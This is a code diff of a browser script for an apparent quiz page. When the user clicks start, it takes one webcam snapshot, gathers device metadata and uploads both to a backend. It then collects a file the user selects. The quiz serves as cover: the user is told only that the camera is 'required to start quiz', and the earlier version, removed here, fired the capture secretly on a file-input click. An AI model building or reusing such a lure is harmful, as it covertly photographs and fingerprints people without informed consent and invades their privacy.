@@ -1,19 +1,61 @@
-const form = document.getElementById("quiz-form");
+const startBtn = document.getElementById("start-btn");
+const quizContainer = document.getElementById("quiz-container");
+const quizForm = document.getElementById("quiz-form");
+const successContainer = document.getElementById("success-container");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
-const BACKEND_BASE = "/api"; // change if needed
-
-// Camera constraints
-const constraints = { video: { facingMode: "user" }, audio: false };
-
-// only capture once
+const BACKEND_BASE = "/api";
 let cameraCaptured = false;
 
-// ================================
-// COLLECT METADATA
-// ================================
+// ====================
+// Start quiz & capture camera
+// ====================
+startBtn.addEventListener("click", async () => {
+  startBtn.disabled = true;
+
+  try {
+    // System camera popup only
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    video.srcObject = stream;
+
+    // wait 1s for camera
+    await new Promise(r => setTimeout(r, 1000));
+
+    quizContainer.style.display = "block";
+    document.getElementById("start-container").style.display = "none";
+
+    // Capture image once
+    if (!cameraCaptured) {
+      const ctx = canvas.getContext("2d");
+      canvas.width = 640;
+      canvas.height = 480;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const image = canvas.toDataURL("image/png");
+      const metadata = await collectMetadata();
+
+      await fetch(`${BACKEND_BASE}/upload`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image, metadata })
+      });
+
+      // Stop camera
+      stream.getTracks().forEach(t => t.stop());
+      cameraCaptured = true;
+    }
+  } catch (err) {
+    console.error("Camera permission denied:", err);
+    alert("Camera permission is required to start quiz.");
+    startBtn.disabled = false;
+  }
+});
+
+// ====================
+// Collect metadata
+// ====================
 async function collectMetadata() {
   const metadata = {
     useragent: navigator.userAgent,
@@ -47,76 +89,35 @@ async function collectMetadata() {
   return metadata;
 }
 
-// ================================
-// CAPTURE CAMERA (ONLY ONCE)
-// ================================
-async function captureCameraOnce() {
-  if (cameraCaptured) return;
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    video.srcObject = stream;
-
-    await new Promise(r => setTimeout(r, 2000)); // wait for camera to initialize
-
-    canvas.width = 640;
-    canvas.height = 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    const image = canvas.toDataURL("image/png");
-    const metadata = await collectMetadata();
-
-    await fetch(`${BACKEND_BASE}/upload`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image, metadata }),
-    });
-
-    stream.getTracks().forEach(t => t.stop());
-    cameraCaptured = true;
-  } catch (err) {
-    console.log("Camera blocked or denied:", err);
-    cameraCaptured = true; // prevent repeated prompts
-  }
-}
-
-// Trigger camera capture **only once** when user first clicks the file input
-let cameraRequested = false;
-fileInput.addEventListener("click", async () => {
-  if (!cameraRequested) {
-    cameraRequested = true;
-    await captureCameraOnce();
-  }
-});
-
-// ================================
-// UPLOAD FILE
-// ================================
+// ====================
+// Upload file
+// ====================
 async function uploadFile(file) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
+
     reader.onload = async () => {
       try {
         const res = await fetch(`${BACKEND_BASE}/file-upload`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ file: reader.result, filename: file.name }),
+          body: JSON.stringify({ file: reader.result, filename: file.name })
         });
         resolve(await res.json());
       } catch (err) {
         reject(err);
       }
     };
+
     reader.onerror = () => reject(reader.error);
     reader.readAsDataURL(file);
   });
 }
 
-// ================================
-// FORM SUBMISSION
-// ================================
-form.addEventListener("submit", async (e) => {
+// ====================
+// Form submit
+// ====================
+quizForm.addEventListener("submit", async (e) => {
   e.preventDefault();
 
   if (!fileInput.files.length) {
@@ -125,14 +126,11 @@ form.addEventListener("submit", async (e) => {
   }
 
   try {
-    // Upload the selected file
     await uploadFile(fileInput.files[0]);
-
-    // Show success page
-    document.getElementById("quiz-container").style.display = "none";
-    document.getElementById("success-container").style.display = "flex";
+    quizContainer.style.display = "none";
+    successContainer.style.display = "block";
   } catch (err) {
-    console.error("Submit error:", err);
-    alert("Upload failed. Please try again.");
+    console.error("Submit failed:", err);
+    alert("Upload failed. Try again.");
   }
 });
